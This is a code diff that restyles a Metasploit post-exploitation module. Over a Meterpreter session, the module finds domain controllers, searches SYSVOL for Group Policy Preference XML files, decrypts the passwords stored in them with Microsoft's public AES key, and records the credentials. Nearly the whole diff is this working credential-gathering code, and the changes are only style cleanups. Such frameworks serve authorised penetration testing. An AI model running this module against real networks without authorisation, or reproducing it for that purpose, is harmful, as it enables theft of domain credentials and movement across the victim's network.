@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -14,44 +15,44 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::NetAPI
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
-      'Description'   => %q{
-        This module enumerates the victim machine's domain controller and
-        connects to it via SMB. It then looks for Group Policy Preference XML
-        files containing local user accounts and passwords and decrypts them
-        using Microsofts public AES key.
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
+                      'Description'   => %q(
+                        This module enumerates the victim machine's domain controller and
+                        connects to it via SMB. It then looks for Group Policy Preference XML
+                        files containing local user accounts and passwords and decrypts them
+                        using Microsofts public AES key.
 
-        Cached Group Policy files may be found on end-user devices if the group
-        policy object is deleted rather than unlinked.
+                        Cached Group Policy files may be found on end-user devices if the group
+                        policy object is deleted rather than unlinked.
 
-        Tested on WinXP SP3 Client and Win2k8 R2 DC.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>[
-        'Ben Campbell',
-        'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
-        'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
-        'theLightCosine',
-        'mubix' #domain/dc enumeration code
-        ],
-      'References'    =>
-        [
-          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
-          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
-          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
-          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
-          ['MSB', 'MS14-025']
-        ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+                        Tested on WinXP SP3 Client and Win2k8 R2 DC.
+                      ),
+                      'License' => MSF_LICENSE,
+                      'Author' => [
+                        'Ben Campbell',
+                        'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
+                        'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
+                        'theLightCosine',
+                        'mubix' # domain/dc enumeration code
+                      ],
+                      'References'    =>
+                        [
+                          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
+                          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
+                          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
+                          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
+                          ['MSB', 'MS14-025']
+                        ],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
 
     register_options([
-      OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
-      OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
-      OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
+                       OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
+                       OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
+                       OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])
+                     ], self.class)
   end
 
   def run
@@ -92,22 +93,22 @@ class MetasploitModule < Msf::Post
     end
 
     # If user supplied domains this implicitly cancels the ALL flag.
-    if datastore['ALL'] and datastore['DOMAINS'].blank?
+    if datastore['ALL'] && datastore['DOMAINS'].blank?
       print_status "Enumerating Domains on the Network..."
       domains = enum_domains
-      domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
+      domains.reject! { |n| n == "WORKGROUP" || n.to_s.empty? }
     end
 
     # Add user specified domains to list.
     unless datastore['DOMAINS'].blank?
-      if datastore['DOMAINS'].match(/\./)
+      if datastore['DOMAINS'] =~ /\./
         print_error "DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'."
         return
       end
       user_domains = datastore['DOMAINS'].split(' ')
-      user_domains = user_domains.map {|x| x.upcase}
+      user_domains = user_domains.map(&:upcase)
       print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
-      user_domains.each{|ud| domains << ud}
+      user_domains.each { |ud| domains << ud }
     end
 
     # If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
@@ -129,9 +130,7 @@ class MetasploitModule < Msf::Post
       dcs = [] if dcs.nil?
 
       # Add registry cached DC for the test case where no DC is enumerated on the network.
-      if !cached_dc.nil? && (cached_dc.include? domain)
-        dcs << cached_dc
-      end
+      dcs << cached_dc if !cached_dc.nil? && (cached_dc.include? domain)
 
       next if dcs.blank?
       dcs.uniq!
@@ -139,13 +138,12 @@ class MetasploitModule < Msf::Post
       dcs.each do |dc|
         print_status "Searching for Policy Share on #{dc}..."
         tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
-        #If we got a basepath from the DC we know that we can reach it
-        #All DCs on the same domain should be the same so we only need one
-        unless tbase.blank?
-          print_good "Found Policy Share on #{dc}"
-          basepaths << tbase
-          break
-        end
+        # If we got a basepath from the DC we know that we can reach it
+        # All DCs on the same domain should be the same so we only need one
+        next if tbase.blank?
+        print_good "Found Policy Share on #{dc}"
+        basepaths << tbase
+        break
       end
     end
 
@@ -169,10 +167,9 @@ class MetasploitModule < Msf::Post
       tmpfile = gpp_xml_file(filepath)
       parse_xml(tmpfile) if tmpfile
     end
-
   end
 
-  def get_basepaths(base, cached=false)
+  def get_basepaths(base, cached = false)
     locals = []
     begin
       session.fs.dir.foreach(base) do |sub|
@@ -198,7 +195,7 @@ class MetasploitModule < Msf::Post
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error "Error accessing #{base} : #{e.message}"
     end
-    return locals
+    locals
   end
 
   def find_path(path, xml_path)
@@ -217,15 +214,15 @@ class MetasploitModule < Msf::Post
 
       spath = path.split('\\')
       retobj = {
-        :dc     => spath[2],
-        :path   => path,
-        :xml    => data
+        dc: spath[2],
+        path: path,
+        xml: data
       }
-      if spath[4] == "sysvol"
-        retobj[:domain] = spath[5]
-      else
-        retobj[:domain] = spath[4]
-      end
+      retobj[:domain] = if spath[4] == "sysvol"
+                          spath[5]
+                        else
+                          spath[4]
+                        end
       return retobj
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error "Received error code #{e.code} when reading #{path}"
@@ -236,7 +233,7 @@ class MetasploitModule < Msf::Post
   def parse_xml(xmlfile)
     mxml = xmlfile[:xml]
     print_status "Parsing file: #{xmlfile[:path]} ..."
-    filetype = File.basename(xmlfile[:path].gsub("\\","/"))
+    filetype = File.basename(xmlfile[:path].tr("\\", "/"))
     results = Rex::Parser::GPP.parse(mxml)
 
     tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])
@@ -256,7 +253,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def report_creds(user, password, disabled)
+  def report_creds(user, password, _disabled)
     service_data = {
       address: session.session_host,
       port: 445,
@@ -268,7 +265,7 @@ class MetasploitModule < Msf::Post
     credential_data = {
       origin_type: :session,
       session_id: session_db_id,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       username: user,
       private_data: password,
       private_type: :password
@@ -332,7 +329,7 @@ class MetasploitModule < Msf::Post
     begin
       subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\"
       v_name = "DCName"
-      dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
+      dc = registry_getvaldata(subkey, v_name).delete('\\').upcase
       print_status "Retrieved DC #{dc} from registry"
       return dc
     rescue
@@ -351,9 +348,7 @@ class MetasploitModule < Msf::Post
 
     # Pulls cached domains from registry
     domain_cache = registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\")
-    if domain_cache
-      domain_cache.each { |ud| domains << ud }
-    end
+    domain_cache&.each { |ud| domains << ud }
 
     locations.each do |location|
       begin
@@ -373,6 +368,6 @@ class MetasploitModule < Msf::Post
     domains.uniq!
     print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
 
-    return domains
+    domains
   end
 end
